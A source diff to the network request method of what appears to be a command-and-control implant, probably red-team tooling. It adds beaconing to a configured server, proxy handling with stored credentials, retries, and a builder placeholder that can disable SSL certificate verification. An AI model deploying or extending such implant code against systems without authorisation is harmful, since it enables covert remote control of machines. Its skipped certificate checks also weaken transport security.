@@ -194,31 +194,85 @@ CRYPTO_MODULE_PLACEHOLDER
             return False
 
      
+
     def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
-        hdrs = self.agent_config["Headers"]
-        url = f"{self.agent_config['Server']}{self.agent_config['PostURI'] if method == 'POST' else self.agent_config['GetURI'] + '?' + self.agent_config['GetParam'] + '=' + data.decode()}"
-        req = urllib.request.Request(url, data if method == 'POST' else None, hdrs)
-        context = ssl._create_unverified_context()
-        
+        # Build headers
+        hdrs = {}
+        for header in self.agent_config["Headers"]:
+            hdrs[header] = self.agent_config["Headers"][header]
+
+        # Build URL depending on method
+        if method == 'GET':
+            url = (
+                self.agent_config["Server"]
+                + ":" + self.agent_config["Port"]
+                + self.agent_config["GetURI"]
+                + "?" + self.agent_config["GetParam"]
+                + "=" + data.decode()
+            )
+            req = urllib.request.Request(url, None, hdrs)
+        else:
+            url = (
+                self.agent_config["Server"]
+                + ":" + self.agent_config["Port"]
+                + self.agent_config["PostURI"]
+            )
+            req = urllib.request.Request(url, data, hdrs)
+
+        # ----- CERTIFICATE HANDLING PLACEHOLDER -----
+        # The builder will replace #CERTSKIP with either:
+        # 1. gcontext that skips SSL verification
+        # 2. nothing (if https_check != "No")
+        #CERTSKIP
+
+        # ----- PROXY HANDLING -----
+        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
+            tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
+            handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler
+
+            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
+                proxy = urllib.request.ProxyHandler({
+                    tls: "{}://{}:{}@{}:{}".format(
+                        tls,
+                        self.agent_config["ProxyUser"],
+                        self.agent_config["ProxyPass"],
+                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
+                        self.agent_config["ProxyPort"],
+                    )
+                })
+                auth = urllib.request.HTTPBasicAuthHandler()
+                opener = urllib.request.build_opener(proxy, auth, handler())
+            else:
+                proxy = urllib.request.ProxyHandler({
+                    tls: "{}://{}:{}".format(
+                        tls,
+                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
+                        self.agent_config["ProxyPort"],
+                    )
+                })
+                opener = urllib.request.build_opener(proxy, handler())
+            urllib.request.install_opener(opener)
+
+        # ----- RETRY LOOP -----
         for attempt in range(max_retries):
             try:
-                with urllib.request.urlopen(req, context=context) as response:
+                # The builder may replace this line:
+                with urllib.request.urlopen(req) as response:
                     raw_response = response.read()
                     try:
                         out = base64.b64decode(raw_response)
-                    except Exception as e:
+                    except Exception:
                         out = raw_response
                     if out:  # Ensure response is not empty
                         return out
-                    else:
-                        pass
-            except Exception as e:
+            except Exception:
                 pass
-            
+
             if attempt < max_retries - 1:
                 time.sleep(retry_delay)
-        
+
         return ""
+
 
       
     def passedKilldate(self):
